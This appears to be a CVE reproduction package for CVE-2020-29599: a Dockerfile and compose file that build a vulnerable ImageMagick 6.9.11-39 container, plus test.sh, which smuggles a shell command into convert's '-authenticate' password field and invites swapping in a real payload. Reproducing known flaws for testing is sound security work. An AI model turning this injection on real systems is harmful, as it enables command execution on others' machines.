{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-29599/custom_no_tool/docker-compose.yml",
            "content": "services:\n  imagemagick:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    container_name: imagemagick_vulnerable\n    volumes:\n      - ./scripts:/scripts\n    working_dir: /scripts\n    command: [\"/bin/sh\", \"-c\", \"while :; do sleep 2073600; done\"]\n    networks:\n      - cve_network\n\nnetworks:\n  cve_network:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2020-29599/custom_no_tool/Dockerfile",
            "content": "# Use Ubuntu 20.04 as the base image\nFROM ubuntu:20.04\n\n# Install necessary packages for building ImageMagick\nRUN apt-get update && \\\n    DEBIAN_FRONTEND=noninteractive apt-get install -y \\\n    build-essential \\\n    wget \\\n    libjpeg-dev \\\n    libpng-dev \\\n    libtiff-dev \\\n    libfreetype6-dev \\\n    libxml2-dev && \\\n    rm -rf /var/lib/apt/lists/*\n\n# Download and build ImageMagick version 6.9.11-39\nWORKDIR /tmp\nRUN wget https://download.imagemagick.org/ImageMagick/download/releases/ImageMagick-6.9.11-39.tar.gz && \\\n    tar -xzf ImageMagick-6.9.11-39.tar.gz && \\\n    cd ImageMagick-6.9.11-39 && \\\n    ./configure && \\\n    make && \\\n    make install && \\\n    ldconfig && \\\n    cd .. && \\\n    rm -rf ImageMagick-6.9.11-39 ImageMagick-6.9.11-39.tar.gz\n\n# Set the working directory\nWORKDIR /scripts\n\n# Copy the scripts into the container\nCOPY scripts /scripts\n\n# Run a simple command to keep the container alive\nCMD [\"/bin/sh\", \"-c\", \"while :; do sleep 2073600; done\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2020-29599/custom_no_tool/scripts/test.sh",
            "content": "#!/bin/sh\n\n# Sample script to demonstrate the vulnerability\n# This script tries to use the '-authenticate' parameter with a crafted input\n# to exploit the CVE-2020-29599 vulnerability.\n\n# Create a dummy PDF file for testing\nconvert -size 100x100 xc:white test.pdf\n\n# Attempt to exploit the vulnerability\n# The following command simulates an attack by injecting a shell command\n# Replace 'echo Vulnerable' with the actual payload for testing\nconvert test.pdf -authenticate \"password; echo Vulnerable\" output.pdf\n\n# Check if the command was executed\nif [ -f output.pdf ]; then\n  echo \"Exploit attempt complete. Check for the 'Vulnerable' message.\"\nfi\n"
        }
    ],
    "directory_tree": "CVE-2020-29599/\n\u2514\u2500\u2500 custom_no_tool/\n    \u251c\u2500\u2500 Dockerfile\n    \u251c\u2500\u2500 docker-compose.yml\n    \u2514\u2500\u2500 scripts/\n        \u2514\u2500\u2500 test.sh"
}